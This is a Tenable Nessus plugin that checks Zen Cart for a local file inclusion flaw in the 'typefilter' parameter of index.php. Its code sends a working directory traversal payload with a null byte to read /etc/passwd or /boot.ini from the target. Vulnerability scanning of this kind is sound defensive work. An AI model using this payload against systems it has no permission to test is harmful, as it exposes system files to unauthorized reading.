#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(49708);
  script_version("$Revision: 1.11 $");

  script_bugtraq_id(43628);
  script_osvdb_id(68300);
  script_xref(name:"EDB-ID", value:15166);

  script_name(english:"Zen Cart index.php typefilter Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
local file inclusion attack." );
 script_set_attribute(attribute:"description", value:
"The installed version of Zen Cart does not validate user-supplied
input to the 'typefilter' parameter of the 'index.php' script.  An
unauthenticated, remote attacker can leverage this issue to read
arbitrary files on the remote web server with the permissions that the 
web server process runs with.");
 script_set_attribute(attribute:"solution", value:
"Upgrade to Zen Cart 1.3.9g or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Zen Cart 1.3.9f LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4967.php");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/04");
  script_set_attribute(attribute:"vuln_publication_date", value: "2010/10/01");
  script_set_attribute(attribute:"patch_publication_date", value: "2010/09/29");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:zen-cart:zen_cart");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("zencart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded:0, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/zencart"));
if (isnull(install)) exit(0, "Zen Cart was not detected on port "+port+".");

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";

if (!isnull(matches))
{
  dir = matches[2];

  foreach fname ( keys(file_pats) )
  {
  # Try to exploit the flaw to read a local file.
  url = matches[2] + "/index.php"+ string("?typefilter=../../../../../../../../../..", fname, "%00");
  r = http_send_recv3(method: "GET", item: url, port: port, exit_on_fail:TRUE);

  if ( egrep(pattern:file_pats[fname], string:r[2]))
  {
   report = 'Nessus was able to exploit the issue to retrieve the contents of\n' +
	    '\'' + fname + '\'' + ' on the remote host using the following URL:\n' +  build_url(port:port, qs:url) + '\n';
   if ( report_verbosity > 0 ) 
   {  
    report += '\nHere are its contents :\n' + 
  	crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
	r[2] + '\n' + 
  	crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
   }
 
   security_warning(port:port, extra:report);
   exit(0);
  }
 }
}
exit(0, "The host is not affected.");
